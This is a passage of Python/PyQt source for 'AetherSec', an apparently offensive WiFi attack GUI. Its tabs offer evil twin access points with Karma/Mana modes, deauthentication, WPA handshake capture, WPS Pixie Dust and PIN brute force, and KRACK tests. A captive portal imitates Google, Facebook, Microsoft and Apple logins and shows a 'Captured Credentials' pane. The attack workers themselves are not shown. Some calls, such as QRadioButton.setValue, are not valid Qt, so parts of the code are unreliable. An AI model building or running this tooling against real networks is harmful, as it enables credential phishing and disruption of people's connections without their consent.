            format.setForeground(QColor(color))
            cursor.setCharFormat(format)

        cursor.insertText(f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n")
        self.setTextCursor(cursor)
        self.ensureCursorVisible()

    def append_error(self, text: str):
        self.append_output(f"ERROR: {text}", COLORS['error'])

    def append_success(self, text: str):
        self.append_output(text, COLORS['success'])

    def append_warning(self, text: str):
        self.append_output(text, COLORS['warning'])


# ============================================================================
# MAIN GUI WINDOW
# ============================================================================

class AetherSecGUI(QMainWindow):
    """Main AetherSec WiFi Framework GUI"""

    def __init__(self):
        super().__init__()
        self.setWindowTitle(f"{APP_NAME} v{APP_VERSION}")
        self.setGeometry(100, 100, 1400, 900)

        # State
        self.interface_manager = InterfaceManager()
        self.selected_interface = None
        self.selected_network: Optional[WiFiNetwork] = None
        self.networks: Dict[str, WiFiNetwork] = {}
        self.clients: Dict[str, WiFiClient] = {}

        # Threads
        self.scanner_thread: Optional[NetworkScanner] = None
        self.evil_twin_worker: Optional[EvilTwinWorker] = None
        self.wps_worker: Optional[WPSAttack] = None
        self.krack_worker: Optional[KRACKAttack] = None
        self.captive_worker: Optional[CaptiveFlaskWorker] = None
        self.handshake_worker: Optional[HandshakeCapture] = None
        self.deauth_worker: Optional[DeauthAttack] = None

        # UI Setup
        self._setup_styles()
        self._init_ui()
        self._setup_menu()

    def _setup_styles(self):
        """Setup dark theme stylesheet"""
        stylesheet = f"""
        QMainWindow {{
            background-color: {COLORS['background']};
            color: {COLORS['text']};
        }}
        QWidget {{
            background-color: {COLORS['background']};
            color: {COLORS['text']};
        }}
        QTabWidget::pane {{
            border: 1px solid {COLORS['border']};
            background-color: {COLORS['surface']};
        }}
        QTabBar::tab {{
            background-color: {COLORS['surface_alt']};
            color: {COLORS['text']};
            padding: 10px 20px;
            margin: 2px;
            border-radius: 4px;
        }}
        QTabBar::tab:selected {{
            background-color: {COLORS['primary']};
            color: {COLORS['background']};
            font-weight: bold;
        }}
        QPushButton {{
            background-color: {COLORS['primary']};
            color: {COLORS['background']};
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-weight: bold;
        }}
        QPushButton:hover {{
            background-color: {COLORS['accent']};
        }}
        QPushButton:disabled {{
            background-color: {COLORS['surface_alt']};
            color: {COLORS['text_dim']};
        }}
        QPushButton[stopButton="true"] {{
            background-color: {COLORS['danger']};
        }}
        QPushButton[stopButton="true"]:hover {{
            background-color: #d73a49;
        }}
        QTableWidget {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            gridline-color: {COLORS['border']};
            border: 1px solid {COLORS['border']};
        }}
        QTableWidget::item:selected {{
            background-color: {COLORS['primary']};
            color: {COLORS['background']};
        }}
        QHeaderView::section {{
            background-color: {COLORS['surface_alt']};
            color: {COLORS['text']};
            padding: 5px;
            border: 1px solid {COLORS['border']};
            font-weight: bold;
        }}
        QTextEdit, QTextBrowser {{
            background-color: {COLORS['terminal_bg']};
            color: {COLORS['terminal_text']};
            border: 1px solid {COLORS['border']};
            font-family: 'Courier New', monospace;
        }}
        QLineEdit {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            border: 1px solid {COLORS['border']};
            padding: 8px;
            border-radius: 3px;
        }}
        QLineEdit:focus {{
            border: 2px solid {COLORS['primary']};
        }}
        QComboBox {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            border: 1px solid {COLORS['border']};
            padding: 5px;
            border-radius: 3px;
        }}
        QCheckBox {{
            color: {COLORS['text']};
        }}
        QCheckBox::indicator:checked {{
            background-color: {COLORS['accent']};
        }}
        QLabel {{
            color: {COLORS['text']};
        }}
        QGroupBox {{
            color: {COLORS['text']};
            border: 1px solid {COLORS['border']};
            border-radius: 4px;
            margin-top: 10px;
            padding-top: 10px;
        }}
        QGroupBox::title {{
            subcontrol-origin: margin;
            left: 10px;
            padding: 0 5px;
        }}
        QStatusBar {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            border-top: 1px solid {COLORS['border']};
        }}
        QMenuBar {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
        }}
        QMenuBar::item:selected {{
            background-color: {COLORS['primary']};
        }}
        QMenu {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            border: 1px solid {COLORS['border']};
        }}
        QMenu::item:selected {{
            background-color: {COLORS['primary']};
        }}
        QListWidget {{
            background-color: {COLORS['surface']};
            color: {COLORS['text']};
            border: 1px solid {COLORS['border']};
        }}
        QListWidget::item:selected {{
            background-color: {COLORS['primary']};
            color: {COLORS['background']};
        }}
        QProgressBar {{
            background-color: {COLORS['surface_alt']};
            border: 1px solid {COLORS['border']};
            border-radius: 3px;
            text-align: center;
        }}
        QProgressBar::chunk {{
            background-color: {COLORS['accent']};
        }}
        """
        self.setStyleSheet(stylesheet)

    def _init_ui(self):
        """Initialize main UI"""
        central = QWidget()
        self.setCentralWidget(central)

        layout = QHBoxLayout(central)
        layout.setContentsMargins(0, 0, 0, 0)

        # Main splitter
        splitter = QSplitter(Qt.Horizontal)

        # Left panel - Interface & Networks
        left_panel = self._create_left_panel()
        splitter.addWidget(left_panel)

        # Right panel - Tabs
        self.tabs = QTabWidget()

        # Recon Tab
        recon_tab = self._create_recon_tab()
        self.tabs.addTab(recon_tab, "📡 Recon")

        # Evil Twin Tab
        evil_tab = self._create_evil_twin_tab()
        self.tabs.addTab(evil_tab, "👿 Evil Twin")

        # Handshake Tab
        handshake_tab = self._create_handshake_tab()
        self.tabs.addTab(handshake_tab, "🔐 Handshake")

        # WPS Tab
        wps_tab = self._create_wps_tab()
        self.tabs.addTab(wps_tab, "🔑 WPS")

        # KRACK Tab
        krack_tab = self._create_krack_tab()
        self.tabs.addTab(krack_tab, "⚡ KRACK")

        # Captive Portal Tab
        captive_tab = self._create_captive_tab()
        self.tabs.addTab(captive_tab, "🌐 Captive Portal")

        # Manual Builder Tab
        manual_tab = self._create_manual_tab()
        self.tabs.addTab(manual_tab, "🔧 Manual Builder")

        splitter.addWidget(self.tabs)
        splitter.setStretchFactor(0, 1)
        splitter.setStretchFactor(1, 3)

        layout.addWidget(splitter)

        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready | Select interface to begin")

    def _create_left_panel(self) -> QWidget:
        """Create left panel with interface list"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Title
        title = QLabel("🔌 Interfaces")
        title.setFont(QFont("Arial", 12, QFont.Bold))
        layout.addWidget(title)

        # Refresh button
        refresh_btn = QPushButton("🔄 Refresh")
        refresh_btn.clicked.connect(self._refresh_interfaces)
        layout.addWidget(refresh_btn)

        # Interface list
        self.interface_list = QListWidget()
        self.interface_list.itemSelectionChanged.connect(self._on_interface_selected)
        layout.addWidget(self.interface_list)

        # Mode buttons
        btn_layout = QHBoxLayout()

        self.monitor_btn = QPushButton("📡 Monitor ON")
        self.monitor_btn.clicked.connect(self._enable_monitor)
        btn_layout.addWidget(self.monitor_btn)

        self.managed_btn = QPushButton("📶 Managed")
        self.managed_btn.clicked.connect(self._disable_monitor)
        btn_layout.addWidget(self.managed_btn)

        layout.addLayout(btn_layout)

        # Interface info
        info_group = QGroupBox("Interface Info")
        info_layout = QVBoxLayout(info_group)

        self.iface_info = QTextEdit()
        self.iface_info.setReadOnly(True)
        self.iface_info.setMaximumHeight(150)
        info_layout.addWidget(self.iface_info)

        layout.addWidget(info_group)

        # Network list (quick view)
        network_group = QGroupBox("Scanned Networks")
        network_layout = QVBoxLayout(network_group)

        self.network_list = QListWidget()
        self.network_list.setMaximumHeight(200)
        self.network_list.itemSelectionChanged.connect(self._on_network_selected_from_list)
        network_layout.addWidget(self.network_list)

        layout.addWidget(network_group)

        # Initial refresh
        self._refresh_interfaces()

        return widget

    def _create_recon_tab(self) -> QWidget:
        """Create reconnaissance tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Controls
        control_layout = QHBoxLayout()

        self.scan_btn = QPushButton("▶ Start Scan")
        self.scan_btn.clicked.connect(self._start_scanner)
        control_layout.addWidget(self.scan_btn)

        self.stop_scan_btn = QPushButton("⏹ Stop")
        self.stop_scan_btn.clicked.connect(self._stop_scanner)
        self.stop_scan_btn.setEnabled(False)
        control_layout.addWidget(self.stop_scan_btn)

        control_layout.addWidget(QLabel("Channel:"))
        self.channel_filter = QComboBox()
        self.channel_filter.addItems(["All", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13"])
        control_layout.addWidget(self.channel_filter)

        control_layout.addStretch()

        layout.addLayout(control_layout)

        # Network table
        self.network_table = QTableWidget()
        self.network_table.setColumnCount(10)
        self.network_table.setHorizontalHeaderLabels([
            "BSSID", "SSID", "CH", "Signal", "Security", "Encryption", "Auth", "Mfg", "WPS", "Clients"
        ])
        self.network_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
        self.network_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.network_table.itemSelectionChanged.connect(self._on_network_table_selected)
        layout.addWidget(self.network_table)

        # Terminal output
        self.recon_terminal = TerminalWidget()
        layout.addWidget(self.recon_terminal)

        # Status
        status_layout = QHBoxLayout()
        self.scan_status_label = QLabel("Status: Idle")
        status_layout.addWidget(self.scan_status_label)
        status_layout.addStretch()
        self.network_count_label = QLabel("Networks: 0")
        status_layout.addWidget(self.network_count_label)
        layout.addLayout(status_layout)

        return widget

    def _create_evil_twin_tab(self) -> QWidget:
        """Create Evil Twin / Honeypot tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Configuration
        config_group = QGroupBox("Configuration")
        config_layout = QFormLayout(config_group)

        self.evil_ssid = QLineEdit()
        self.evil_ssid.setText("FreeWiFi")
        config_layout.addRow("SSID:", self.evil_ssid)

        self.evil_channel = QSpinBox()
        self.evil_channel.setRange(1, 13)
        self.evil_channel.setValue(6)
        config_layout.addRow("Channel:", self.evil_channel)

        self.evil_password = QLineEdit()
        self.evil_password.setEchoMode(QLineEdit.Password)
        config_layout.addRow("Password:", self.evil_password)

        layout.addWidget(config_group)

        # Options
        options_group = QGroupBox("Attack Options")
        options_layout = QVBoxLayout(options_group)

        self.karma_checkbox = QCheckBox("Karma Mode (respond to all probe requests)")
        options_layout.addWidget(self.karma_checkbox)

        self.mana_checkbox = QCheckBox("Mana Mode (evil twin all networks)")
        options_layout.addWidget(self.mana_checkbox)

        self.open_wifi_checkbox = QCheckBox("Open Network (no password)")
        self.open_wifi_checkbox.setChecked(True)
        self.open_wifi_checkbox.toggled.connect(self._on_open_wifi_toggled)
        options_layout.addWidget(self.open_wifi_checkbox)

        self.captive_checkbox = QCheckBox("Enable Captive Portal")
        options_layout.addWidget(self.captive_checkbox)

        layout.addWidget(options_group)

        # Control buttons
        btn_layout = QHBoxLayout()

        self.evil_start_btn = QPushButton("▶ Start Evil Twin")
        self.evil_start_btn.clicked.connect(self._start_evil_twin)
        btn_layout.addWidget(self.evil_start_btn)

        self.evil_stop_btn = QPushButton("⏹ Stop")
        self.evil_stop_btn.setEnabled(False)
        self.evil_stop_btn.setProperty("stopButton", True)
        self.evil_stop_btn.clicked.connect(self._stop_evil_twin)
        btn_layout.addWidget(self.evil_stop_btn)

        layout.addLayout(btn_layout)

        # Terminal
        self.evil_terminal = TerminalWidget()
        layout.addWidget(self.evil_terminal)

        return widget

    def _create_handshake_tab(self) -> QWidget:
        """Create handshake capture tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Target info
        target_group = QGroupBox("Target")
        target_layout = QFormLayout(target_group)

        self.handshake_bssid = QLineEdit()
        self.handshake_bssid.setReadOnly(True)
        target_layout.addRow("BSSID:", self.handshake_bssid)

        self.handshake_ssid = QLineEdit()
        self.handshake_ssid.setReadOnly(True)
        target_layout.addRow("SSID:", self.handshake_ssid)

        self.handshake_channel = QLineEdit()
        self.handshake_channel.setReadOnly(True)
        target_layout.addRow("Channel:", self.handshake_channel)

        layout.addWidget(target_group)

        # Deauth options
        deauth_group = QGroupBox("Deauth Attack")
        deauth_layout = QHBoxLayout(deauth_group)

        self.deauth_btn = QPushButton("▶ Send Deauth")
        self.deauth_btn.clicked.connect(self._send_deauth)
        deauth_layout.addWidget(self.deauth_btn)

        self.deauth_client = QLineEdit()
        self.deauth_client.setPlaceholderText("Client MAC (optional)")
        deauth_layout.addWidget(self.deauth_client)

        self.deauth_count = QSpinBox()
        self.deauth_count.setRange(1, 100)
        self.deauth_count.setValue(10)
        deauth_layout.addWidget(QLabel("Count:"))
        deauth_layout.addWidget(self.deauth_count)

        layout.addWidget(deauth_group)

        # Handshake capture
        capture_group = QGroupBox("Handshake Capture")
        capture_layout = QHBoxLayout(capture_group)

        self.handshake_btn = QPushButton("▶ Start Capture")
        self.handshake_btn.clicked.connect(self._start_handshake_capture)
        capture_layout.addWidget(self.handshake_btn)

        self.handshake_stop_btn = QPushButton("⏹ Stop")
        self.handshake_stop_btn.setEnabled(False)
        self.handshake_stop_btn.setProperty("stopButton", True)
        self.handshake_stop_btn.clicked.connect(self._stop_handshake_capture)
        capture_layout.addWidget(self.handshake_stop_btn)

        self.handshake_file = QLineEdit()
        self.handshake_file.setText("/tmp/handshake")
        capture_layout.addWidget(QLabel("Output:"))
        capture_layout.addWidget(self.handshake_file)

        layout.addWidget(capture_group)

        # Terminal
        self.handshake_terminal = TerminalWidget()
        layout.addWidget(self.handshake_terminal)

        return widget

    def _create_wps_tab(self) -> QWidget:
        """Create WPS attack tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Target
        target_group = QGroupBox("Target")
        target_layout = QFormLayout(target_group)

        self.wps_bssid = QLineEdit()
        self.wps_bssid.setReadOnly(True)
        target_layout.addRow("BSSID:", self.wps_bssid)

        self.wps_channel = QLineEdit()
        self.wps_channel.setReadOnly(True)
        target_layout.addRow("Channel:", self.wps_channel)

        layout.addWidget(target_group)

        # Options
        options_group = QGroupBox("Attack Options")
        options_layout = QVBoxLayout(options_group)

        self.pixie_checkbox = QCheckBox("Pixie Dust Attack")
        self.pixie_checkbox.setChecked(True)
        options_layout.addWidget(self.pixie_checkbox)

        self.brute_force_checkbox = QCheckBox("Brute Force PIN")
        options_layout.addWidget(self.brute_force_checkbox)

        layout.addWidget(options_group)

        # Control
        btn_layout = QHBoxLayout()

        self.wps_start_btn = QPushButton("▶ Start WPS Attack")
        self.wps_start_btn.clicked.connect(self._start_wps_attack)
        btn_layout.addWidget(self.wps_start_btn)

        self.wps_stop_btn = QPushButton("⏹ Stop")
        self.wps_stop_btn.setEnabled(False)
        self.wps_stop_btn.setProperty("stopButton", True)
        self.wps_stop_btn.clicked.connect(self._stop_wps_attack)
        btn_layout.addWidget(self.wps_stop_btn)

        layout.addLayout(btn_layout)

        # Progress
        self.wps_progress = QProgressBar()
        layout.addWidget(self.wps_progress)

        # Terminal
        self.wps_terminal = TerminalWidget()
        layout.addWidget(self.wps_terminal)

        return widget

    def _create_krack_tab(self) -> QWidget:
        """Create KRACK attack tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Target
        target_group = QGroupBox("Target")
        target_layout = QFormLayout(target_group)

        self.krack_bssid = QLineEdit()
        self.krack_bssid.setReadOnly(True)
        target_layout.addRow("BSSID:", self.krack_bssid)

        self.krack_ssid = QLineEdit()
        self.krack_ssid.setReadOnly(True)
        target_layout.addRow("SSID:", self.krack_ssid)

        self.krack_channel = QLineEdit()
        self.krack_channel.setReadOnly(True)
        target_layout.addRow("Channel:", self.krack_channel)

        layout.addWidget(target_group)

        # Attack type
        attack_group = QGroupBox("Attack Type")
        attack_layout = QVBoxLayout(attack_group)

        self.krack_type_group = QButtonGroup(widget)

        krack_all = QRadioButton("All KRACK Vulnerabilities")
        krack_all.setChecked(True)
        krack_all.setValue("all")
        self.krack_type_group.addButton(krack_all)
        attack_layout.addWidget(krack_all)

        krack_msg3 = QRadioButton("Message 3 Replay Only")
        krack_msg3.setValue("msg3")
        self.krack_type_group.addButton(krack_msg3)
        attack_layout.addWidget(krack_msg3)

        krack_nonce = QRadioButton("Nonce Reuse Only")
        krack_nonce.setValue("nonce")
        self.krack_type_group.addButton(krack_nonce)
        attack_layout.addWidget(krack_nonce)

        krack_key = QRadioButton("Key Reinstallation Only")
        krack_key.setValue("key")
        self.krack_type_group.addButton(krack_key)
        attack_layout.addWidget(krack_key)

        layout.addWidget(attack_group)

        # Control
        btn_layout = QHBoxLayout()

        self.krack_start_btn = QPushButton("▶ Start KRACK Test")
        self.krack_start_btn.clicked.connect(self._start_krack_attack)
        btn_layout.addWidget(self.krack_start_btn)

        self.krack_stop_btn = QPushButton("⏹ Stop")
        self.krack_stop_btn.setEnabled(False)
        self.krack_stop_btn.setProperty("stopButton", True)
        self.krack_stop_btn.clicked.connect(self._stop_krack_attack)
        btn_layout.addWidget(self.krack_stop_btn)

        layout.addLayout(btn_layout)

        # Results
        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout(results_group)

        self.krack_results = QTextEdit()
        self.krack_results.setReadOnly(True)
        self.krack_results.setMaximumHeight(150)
        results_layout.addWidget(self.krack_results)

        layout.addWidget(results_group)

        # Terminal
        self.krack_terminal = TerminalWidget()
        layout.addWidget(self.krack_terminal)

        return widget

    def _create_captive_tab(self) -> QWidget:
        """Create captive portal tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Template selection
        template_group = QGroupBox("Portal Template")
        template_layout = QFormLayout(template_group)

        self.captive_template = QComboBox()
        self.captive_template.addItems(["Google Login", "Facebook", "Microsoft", "Apple iCloud",
                                       "Router Config", "WiFi Premium"])
        template_layout.addRow("Template:", self.captive_template)

        self.captive_interface = QLineEdit()
        self.captive_interface.setText("192.168.100.1")
        template_layout.addRow("IP Address:", self.captive_interface)

        layout.addWidget(template_group)

        # Control
        btn_layout = QHBoxLayout()

        self.captive_start_btn = QPushButton("▶ Start Portal")
        self.captive_start_btn.clicked.connect(self._start_captive_portal)
        btn_layout.addWidget(self.captive_start_btn)

        self.captive_stop_btn = QPushButton("⏹ Stop")
        self.captive_stop_btn.setEnabled(False)
        self.captive_stop_btn.setProperty("stopButton", True)
        self.captive_stop_btn.clicked.connect(self._stop_captive_portal)
        btn_layout.addWidget(self.captive_stop_btn)

        layout.addLayout(btn_layout)

        # Captured credentials
        creds_group = QGroupBox("Captured Credentials")
        creds_layout = QVBoxLayout(creds_group)

        self.captured_creds = QTextEdit()
        self.captured_creds.setReadOnly(True)
        self.captured_creds.setMaximumHeight(150)
        creds_layout.addWidget(self.captured_creds)

        layout.addWidget(creds_group)

        # Terminal
        self.captive_terminal = TerminalWidget()
        layout.addWidget(self.captive_terminal)

        return widget

    def _create_manual_tab(self) -> QWidget:
        """Create manual hostapd/dnsmasq builder tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Hostapd config
        hostapd_group = QGroupBox("hostapd.conf Builder")
        hostapd_layout = QFormLayout(hostapd_group)

        self.manual_interface = QComboBox()
        hostapd_layout.addRow("Interface:", self.manual_interface)

        self.manual_ssid = QLineEdit()
        self.manual_ssid.setText("MyAP")
        hostapd_layout.addRow("SSID:", self.manual_ssid)

        self.manual_channel = QSpinBox()
        self.manual_channel.setRange(1, 13)
        self.manual_channel.setValue(6)
        hostapd_layout.addRow("Channel:", self.manual_channel)

        self.manual_hw_mode = QComboBox()
        self.manual_hw_mode.addItems(["g (2.4GHz)", "a (5GHz)", "b (2.4GHz)", "n (2.4GHz)"])
        hostapd_layout.addRow("HW Mode:", self.manual_hw_mode)

        self.manual_security = QComboBox()
        self.manual_security.addItems(["Open", "WPA2", "WPA3"])
        self.manual_security.currentTextChanged.connect(self._on_security_changed)
        hostapd_layout.addRow("Security:", self.manual_security)

        self.manual_password = QLineEdit()
        self.manual_password.setEchoMode(QLineEdit.Password)
        self.manual_password.setEnabled(False)
        hostapd_layout.addRow("Password:", self.manual_password)

        layout.addWidget(hostapd_group)

        # Dnsmasq config
        dnsmasq_group = QGroupBox("dnsmasq.conf Builder")
        dnsmasq_layout = QFormLayout(dnsmasq_group)

        self.manual_ip = QLineEdit()
        self.manual_ip.setText("192.168.50.1")
        dnsmasq_layout.addRow("Gateway IP:", self.manual_ip)

        self.manual_dhcp_start = QLineEdit()
        self.manual_dhcp_start.setText("192.168.50.100")
        dnsmasq_layout.addRow("DHCP Start:", self.manual_dhcp_start)

        self.manual_dhcp_end = QLineEdit()
        self.manual_dhcp_end.setText("192.168.50.200")
        dnsmasq_layout.addRow("DHCP End:", self.manual_dhcp_end)

        self.manual_dns = QLineEdit()
        self.manual_dns.setText("8.8.8.8, 1.1.1.1")
        dnsmasq_layout.addRow("DNS Servers:", self.manual_dns)

        layout.addWidget(dnsmasq_group)

        # Generated config preview
        preview_group = QGroupBox("Generated Configuration")
        preview_layout = QVBoxLayout(preview_group)

        self.config_preview = QTextEdit()
        self.config_preview.setReadOnly(True)
        self.config_preview.setMaximumHeight(200)
        preview_layout.addWidget(self.config_preview)

        self.generate_btn = QPushButton("🔄 Generate Config")
        self.generate_btn.clicked.connect(self._generate_config)
        preview_layout.addWidget(self.generate_btn)

        layout.addWidget(preview_group)

        # Control
        btn_layout = QHBoxLayout()

        self.manual_start_btn = QPushButton("▶ Start AP")
        self.manual_start_btn.clicked.connect(self._start_manual_ap)
        btn_layout.addWidget(self.manual_start_btn)

        self.manual_stop_btn = QPushButton("⏹ Stop AP")
        self.manual_stop_btn.setEnabled(False)
        self.manual_stop_btn.setProperty("stopButton", True)
        self.manual_stop_btn.clicked.connect(self._stop_manual_ap)
        btn_layout.addWidget(self.manual_stop_btn)

        btn_layout.addStretch()

        layout.addLayout(btn_layout)

        # Terminal
        self.manual_terminal = TerminalWidget()
        layout.addWidget(self.manual_terminal)

        # Connect interface list
        self._refresh_interfaces()

        return widget

    def _setup_menu(self):
        """Setup menu bar"""
        menubar = self.menuBar()

        file_menu = menubar.addMenu("&File")
        file_menu.addAction("&Export Networks", self._export_networks)
        file_menu.addAction("&Import Networks", self._import_networks)
        file_menu.addSeparator()
        file_menu.addAction("E&xit", self.close)

        tools_menu = menubar.addMenu("&Tools")
        tools_menu.addAction("&Check Dependencies", self._check_dependencies)
        tools_menu.addAction("&MAC Changer", self._mac_changer)

        help_menu = menubar.addMenu("&Help")
        help_menu.addAction("&About", self._show_about)

    # =========================================================================
    # INTERFACE MANAGEMENT
    # =========================================================================

    def _refresh_interfaces(self):
        """Refresh interface list"""
        interfaces = self.interface_manager.get_wireless_interfaces()

        self.interface_list.clear()

        for iface in interfaces:
            status_icon = "🟢" if iface.is_up() else "🔴"
            mode_icon = "📡" if iface.is_monitor_mode() else "📶"

            item = QListWidgetItem(f"{status_icon} {iface.name} | {mode_icon} {iface.mode.value}")

            if iface.is_monitor_mode():
                item.setForeground(QBrush(QColor(COLORS['accent'])))
            elif iface.is_up():
                item.setForeground(QBrush(QColor(COLORS['primary'])))
            else:
                item.setForeground(QBrush(QColor(COLORS['danger'])))

            self.interface_list.addItem(item)

        # Update manual builder dropdown
        self.manual_interface.clear()
        for iface in interfaces:
            self.manual_interface.addItem(iface.name)

    def _on_interface_selected(self):
        """Handle interface selection"""
        item = self.interface_list.currentItem()
        if item:
            text = item.text()
            self.selected_interface = text.split()[1] if len(text.split()) > 1 else text

            iface_info = self.interface_manager.get_interface_info(self.selected_interface)
            if iface_info:
                mac = self.interface_manager.get_mac_address(self.selected_interface)
                info_text = f"""Name: {iface_info.name}
Status: {iface_info.status.value}
Mode: {iface_info.mode.value}
MAC: {mac}
IP: {iface_info.ip_address or 'N/A'}
Driver: {iface_info.driver or 'Unknown'}"""
                self.iface_info.setText(info_text)

                self.status_bar.showMessage(f"Selected interface: {self.selected_interface}")

    def _enable_monitor(self):
        if not self.selected_interface:
            QMessageBox.warning(self, "Error", "Select an interface first")
            return

        success, msg = self.interface_manager.set_monitor_mode(self.selected_interface, True)

        if success:
            QMessageBox.information(self, "Success", msg)
            self._refresh_interfaces()
        else:
            QMessageBox.critical(self, "Error", msg)

    def _disable_monitor(self):
        if not self.selected_interface:
            QMessageBox.warning(self, "Error", "Select an interface first")
            return

        success, msg = self.interface_manager.set_monitor_mode(self.selected_interface, False)

        if success:
            QMessageBox.information(self, "Success", msg)
            self._refresh_interfaces()
        else:
            QMessageBox.critical(self, "Error", msg)

    # =========================================================================
    # RECON / SCANNING
    # =========================================================================

    def _start_scanner(self):
        if not self.selected_interface:
            QMessageBox.warning(self, "Error", "Select an interface first")
            return

        iface_info = self.interface_manager.get_interface_info(self.selected_interface)
        if not iface_info or not iface_info.is_monitor_mode():
            QMessageBox.warning(self, "Error", "Enable monitor mode first")
            return

        self.scanner_thread = NetworkScanner(self.selected_interface)
        self.scanner_thread.network_found.connect(self._on_network_found)
        self.scanner_thread.networks_updated.connect(self._on_networks_updated)
        self.scanner_thread.scan_status.connect(self._on_scan_status)
        self.scanner_thread.client_found.connect(self._on_client_found)
        self.scanner_thread.start()

        self.scan_btn.setEnabled(False)
        self.stop_scan_btn.setEnabled(True)
        self.recon_terminal.append_output("Scanner started")

    def _stop_scanner(self):
        if self.scanner_thread:
            self.scanner_thread.stop()
            self.scanner_thread.wait(timeout=2000)

        self.scan_btn.setEnabled(True)
        self.stop_scan_btn.setEnabled(False)
        self.recon_terminal.append_output("Scanner stopped")

    def _on_network_found(self, network: WiFiNetwork):
        self.networks[network.bssid] = network
        self._update_network_table()
        self._update_network_list()

    def _on_networks_updated(self, networks: List[WiFiNetwork]):
        self.network_count_label.setText(f"Networks: {len(networks)}")

    def _on_scan_status(self, status: str):
        self.scan_status_label.setText(f"Status: {status}")

    def _on_client_found(self, client: WiFiClient):
        self.clients[client.mac] = client

    def _update_network_table(self):
        self.network_table.setRowCount(0)

        for network in sorted(self.networks.values(), key=lambda x: x.signal, reverse=True):
            row = self.network_table.rowCount()
            self.network_table.insertRow(row)

            self.network_table.setItem(row, 0, QTableWidgetItem(network.bssid))
            self.network_table.setItem(row, 1, QTableWidgetItem(network.ssid))
            self.network_table.setItem(row, 2, QTableWidgetItem(str(network.channel)))

            signal_item = QTableWidgetItem(f"{network.signal} dBm")
            if network.signal > -50:
                signal_item.setForeground(QBrush(QColor(COLORS['success'])))
            elif network.signal > -70:
                signal_item.setForeground(QBrush(QColor(COLORS['warning'])))
            else:
                signal_item.setForeground(QBrush(QColor(COLORS['danger'])))
            self.network_table.setItem(row, 3, signal_item)

            self.network_table.setItem(row, 4, QTableWidgetItem(network.security))
            self.network_table.setItem(row, 5, QTableWidgetItem(network.encryption))
            self.network_table.setItem(row, 6, QTableWidgetItem(network.auth))
            self.network_table.setItem(row, 7, QTableWidgetItem(network.manufacturer))
            self.network_table.setItem(row, 8, QTableWidgetItem(network.wps))
            self.network_table.setItem(row, 9, QTableWidgetItem(str(network.clients)))

    def _update_network_list(self):
        self.network_list.clear()
        for network in sorted(self.networks.values(), key=lambda x: x.signal, reverse=True)[:20]:
            signal_icon = "📶" if network.signal > -60 else "📵"
            item = QListWidgetItem(f"{signal_icon} {network.ssid} ({network.signal} dBm)")
            item.setData(Qt.UserRole, network)
            self.network_list.addItem(item)

    def _on_network_selected_from_list(self):
        item = self.network_list.currentItem()
        if item:
            network = item.data(Qt.UserRole)
            self.selected_network = network
            self._update_target_fields()

    def _on_network_table_selected(self):
        rows = self.network_table.selectedItems()
        if rows:
            row = rows[0].row()
            bssid = self.network_table.item(row, 0).text()
            self.selected_network = self.networks.get(bssid)
            self._update_target_fields()

    def _update_target_fields(self):
        if not self.selected_network:
            return

        # Update handshake tab
        self.handshake_bssid.setText(self.selected_network.bssid)
        self.handshake_ssid.setText(self.selected_network.ssid)
        self.handshake_channel.setText(str(self.selected_network.channel))

        # Update WPS tab
        self.wps_bssid.setText(self.selected_network.bssid)
        self.wps_channel.setText(str(self.selected_network.channel))

        # Update KRACK tab
        self.krack_bssid.setText(self.selected_network.bssid)
        self.krack_ssid.setText(self.selected_network.ssid)
        self.krack_channel.setText(str(self.selected_network.channel))

        # Update Evil Twin tab
        self.evil_ssid.setText(self.selected_network.ssid)
        self.evil_channel.setValue(self.selected_network.channel)

    # =========================================================================
    # EVIL TWIN
    # =========================================================================

    def _on_open_wifi_toggled(self, checked: bool):
        self.evil_password.setEnabled(not checked)

    def _start_evil_twin(self):
        if not self.selected_interface:
            QMessageBox.warning(self, "Error", "Select an interface first")
            return

        ssid = self.evil_ssid.text().strip()
        if not ssid:
            QMessageBox.warning(self, "Error", "Enter SSID")
            return

        karma = self.karma_checkbox.isChecked()
        open_wifi = self.open_wifi_checkbox.isChecked()
        password = self.evil_password.text() if not open_wifi else ""

        self.evil_twin_worker = EvilTwinWorker(
            ssid=ssid,
            interface=self.selected_interface,
            bssid=self.selected_network.bssid if self.selected_network else "",
            channel=self.evil_channel.value(),
            karma_mode=karma,
            open_network=open_wifi,
            password=password
        )

        self.evil_twin_worker.status_changed.connect(self._on_evil_twin_status)
        self.evil_twin_worker.start()

        self.evil_start_btn.setEnabled(False)
        self.evil_stop_btn.setEnabled(True)

        # Start captive portal if enabled
        if self.captive_checkbox.isChecked():
            self._start_captive_portal()

    def _stop_evil_twin(self):
        if self.evil_twin_worker:
            self.evil_twin_worker.stop()
            self.evil_twin_worker.wait(timeout=3000)

        self.evil_start_btn.setEnabled(True)
        self.evil_stop_btn.setEnabled(False)
        self.evil_terminal.append_output("Evil Twin stopped")

        if self.captive_worker:
            self._stop_captive_portal()

    def _on_evil_twin_status(self, status: str):
        self.evil_terminal.append_output(status)

    # =========================================================================
    # HANDSHAKE
    # =========================================================================

    def _send_deauth(self):
        if not self.selected_interface or not self.selected_network:
            QMessageBox.warning(self, "Error", "Select interface and target network")
            return

        client_mac = self.deauth_client.text().strip() or "FF:FF:FF:FF:FF:FF"

        self.deauth_worker = DeauthAttack(
            interface=self.selected_interface,
